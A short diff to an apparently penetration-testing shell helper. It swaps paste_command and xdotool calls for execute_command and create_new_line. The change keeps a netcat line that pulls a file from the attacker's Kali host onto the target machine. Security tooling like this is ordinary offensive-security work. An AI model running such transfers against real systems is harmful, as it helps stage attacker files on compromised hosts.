@@ -14,5 +14,5 @@ generate_form "${SERVER_PORT_FIELD}" "${LOCAL_FILE_FIELD}"
 SERVER_PORT=${form_data["server_port"]}
 LOCAL_FILE=${form_data["local_file_location"]}
 
-paste_command "nc -q 0 ${KALI_IP} ${SERVER_PORT} > ${LOCAL_FILE}"
-xdotool key Return
+execute_command "nc -q 0 ${KALI_IP} ${SERVER_PORT} > ${LOCAL_FILE}"
+create_new_line
